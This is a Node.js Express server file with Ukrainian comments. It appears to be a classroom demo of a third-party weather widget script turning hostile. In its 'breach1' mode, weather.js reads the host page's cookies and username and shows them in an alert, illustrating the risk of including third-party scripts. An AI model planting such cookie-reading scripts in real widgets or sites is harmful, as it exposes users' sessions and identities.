// ============================================================
//  WeatherApp — віджет погоди (http://localhost:5000)
//  "Майбутній атакувальник". Поведінка weather.js керується
//  параметром запуску:
//    node server.js                 -> Normal Mode (лог температури)
//    node server.js --mode breach1  -> Breach1 Mode (крадіжка cookie + імені)
// ============================================================

const express = require('express');
const path = require('path');

const app = express();
const PORT = 5000;

const mode = process.argv.includes('--mode')
  ? process.argv[process.argv.indexOf('--mode') + 1]
  : 'normal';

console.log('[System] Starting WeatherApp v1.0.0...');
console.log(`[System] Режим віджета погоди: "${mode}"`);
if (mode === 'breach1') {
  console.log('[!] BREACH1 активний — weather.js спробує прочитати cookie та ім\'я користувача');
}

// weather.js віддається динамічно: вміст залежить від режиму сервера.
app.get('/weather.js', (req, res) => {
  res.type('application/javascript');

  if (mode === 'breach1') {
    // --- Breach1 Mode ---
    // Скрипт виконується В КОНТЕКСТІ сторінки порту 3000, тож має повний
    // доступ до її document.cookie та DOM. Це і є суть атаки.
    res.send(
      `console.log('[weather] BREACH1: спроба зчитати дані сторінки-господаря');\n` +
      `alert("HACKED: I can see your cookies: " + document.cookie + ` +
      `" and User: " + document.getElementById('username').innerText);\n`
    );
  } else {
    // --- Normal Mode ---
    res.send(
      `console.log('[weather] Поточна температура: +14°C, хмарно (Port 5000)');\n`
    );
  }
});

app.listen(PORT, () => {
  console.log(`[System] WeatherApp слухає на http://localhost:${PORT}`);
});
